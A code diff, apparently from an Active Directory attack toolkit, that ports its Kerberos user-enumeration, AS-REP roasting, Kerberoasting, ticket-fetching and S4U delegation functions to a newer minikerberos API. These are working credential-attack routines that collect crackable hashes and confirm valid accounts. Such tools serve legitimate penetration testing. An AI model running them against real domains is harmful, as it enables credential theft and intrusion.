@@ -4,8 +4,8 @@ import os
 import ntpath
 import glob
 
-from minikerberos.security import KerberosUserEnum, APREPRoast, Kerberoast
-from minikerberos.common.url import KerberosClientURL
+from minikerberos.security import krb5userenum, asreproast, kerberoast
+from minikerberos.common.factory import KerberosClientFactory
 from minikerberos.common.spn import KerberosSPN
 from minikerberos.common.creds import KerberosCredential
 from minikerberos.common.target import KerberosTarget
@@ -13,7 +13,7 @@ from minikerberos.common.keytab import Keytab
 from minikerberos.aioclient import AIOKerberosClient
 from minikerberos.common.utils import print_table
 from minikerberos.common.ccache import CCACHE, Credential
-from minikerberos.common.utils import tgt_to_kirbi
+from minikerberos.common.kirbi import Kirbi
 
 
 def process_target_line(target, realm = None, to_spn = True):
@@ -129,23 +129,19 @@ async def get_TGS(url, spn, out_file = None, override_etype = None):
 		if isinstance(override_etype, int):
 			override_etype = [override_etype]
 
-		ku = KerberosClientURL.from_url(url)
-		cred = ku.get_creds()
-		target = ku.get_target()
+		ku = KerberosClientFactory.from_url(url)
 		spn = KerberosSPN.from_user_email(spn)
 
 		logger.debug('[KERBEROS][TGS] target user: %s' % spn.get_formatted_pname())
 		logger.debug('[KERBEROS][TGS] fetching TGT')
-		kcomm = AIOKerberosClient(cred, target)
+		kcomm = ku.get_client()
 		await kcomm.get_TGT()
 		logger.debug('[KERBEROS][TGS] fetching TGS')
 		tgs, encTGSRepPart, key = await kcomm.get_TGS(spn, override_etype=override_etype)
 
-		kirbi = tgt_to_kirbi(tgs, encTGSRepPart)
-			
+		kirbi = Kirbi.from_ticketdata(tgs, encTGSRepPart)
 		if out_file is not None:
-			with open(out_file, 'wb') as f:
-				f.write(kirbi.dump())
+			kirbi.to_file(out_file)
 
 		logger.debug('[KERBEROS][TGS] done!')
 		return tgs, encTGSRepPart, key, kirbi, None
@@ -157,7 +153,7 @@ async def get_TGT(url, override_etype = None):
 		logger.debug('[KERBEROS][TGT] started')
 		if isinstance(override_etype, int):
 			override_etype = [override_etype]
-		ku = KerberosClientURL.from_url(url)
+		ku = KerberosClientFactory.from_url(url)
 		cred = ku.get_creds()
 		target = ku.get_target()
 
@@ -168,8 +164,7 @@ async def get_TGT(url, override_etype = None):
 		logger.debug('[KERBEROS][TGT] fetching TGT')
 		await kcomm.get_TGT(override_etype=override_etype)
 		
-		kirbi = tgt_to_kirbi(kcomm.kerberos_TGT, kcomm.kerberos_TGT_encpart)
-
+		kirbi = Kirbi.from_ticketdata(kcomm.kerberos_TGT, kcomm.kerberos_TGT_encpart)
 		return kirbi, None
 	except Exception as e:
 		return None, e
@@ -183,19 +178,18 @@ async def brute(host, targets, out_file = None, show_negatives = False):
 		logger.debug('[KERBEROS][BRUTE] User enumeration starting')
 		target = KerberosTarget(host)
 
-		for spn in targets:
-			ke = KerberosUserEnum(target, spn)
-			
-			result = await ke.run()
+		enumusers = [x.username for x in targets]
+		realm = targets[0].realm
+
+		async for username, result, _, err in krb5userenum(target, enumusers, realm):
+			if err is not None:
+				continue
 			if result is True:
 				if out_file:
 					with open(out_file, 'a') as f:
-							f.write(result + '\r\n')
+						f.write(username + '\r\n')
 				else:
-					print('[+] %s' % str(spn))
-			else:
-				if show_negatives is True:
-					print('[-] %s' % str(spn))
+					print('[+] Enumerated user: %s' % str(username))
 
 		logger.info('[KERBEROS][BRUTE] User enumeration finished')
 		return None, None
@@ -212,19 +206,21 @@ async def asreproast(host, targets, out_file = None, etype = 23):
 		logger.debug('[KERBEROS][ASREPROAST] Roasting...')
 		logger.debug('[KERBEROS][ASREPROAST] Supporting the following encryption type: %s' % (str(etype)))
 
-		ks = KerberosTarget(host)
-		ar = APREPRoast(ks)
-		hashes = []
-		for target in targets:
-			h = await ar.run(target, override_etype = [etype])
-			hashes.append(h)
+		usernames = [x.username for x in targets]
+		domain = targets[0].domain
 
-			if out_file:
-				with open(out_file, 'a', newline = '') as f:
-					for thash in hashes:
-						f.write(thash + '\r\n')
-			else:
-				print(h)
+		ks = KerberosTarget(host)
+		hashes = []
+		async for _, h, err in asreproast(ks, usernames, domain, etype):
+			if h is not None:
+				hashes.append(str(h))
+
+		if out_file:
+			with open(out_file, 'a', newline = '') as f:
+				for thash in hashes:
+					f.write(thash + '\r\n')
+		else:
+			print(h)
 
 		logger.info('[KERBEROS][ASREPROAST] Done!')
 		return hashes, None
@@ -249,12 +245,13 @@ async def spnroast(url, targets, out_file = None, etype = 23):
 
 		logger.debug('[KERBEROS][SPNROAST] Using the following encryption type(s): %s' % (','.join(str(x) for x in etypes)))
 		
-		ku = KerberosClientURL.from_url(url)
-		cred = ku.get_creds()
-		target = ku.get_target()
-		ar = Kerberoast(target, cred)
-		hashes = await ar.run(targets, override_etype = etypes)
-
+		ktargets = [x.username for x in targets]
+		kdomain = targets[0].domain
+		ku = KerberosClientFactory.from_url(url)
+		hashes = []
+		async for username,h, err in kerberoast(ku, ktargets, kdomain, etypes):
+			hashes.append(h)
+		
 		if out_file:
 			with open(out_file, 'w', newline = '') as f:
 				for thash in hashes:
@@ -273,7 +270,7 @@ async def spnroast(url, targets, out_file = None, etype = 23):
 async def s4u(url, spn, targetuser):
 	try:
 		logger.debug('[KERBEROS][S4U] Started')
-		cu = KerberosClientURL.from_url(url)
+		cu = KerberosClientFactory.from_url(url)
 		ccred = cu.get_creds()
 		target = cu.get_target()
 
@@ -304,7 +301,7 @@ async def s4u(url, spn, targetuser):
 					break
 
 		logger.debug('[KERBEROS][S4U] Done!')
-		kirbi = tgt_to_kirbi(tgs, encTGSRepPart)
+		kirbi = Kirbi.from_ticketdata(tgs, encTGSRepPart)
 		return tgs, encTGSRepPart, key, kirbi, None
 
 	except Exception as e:
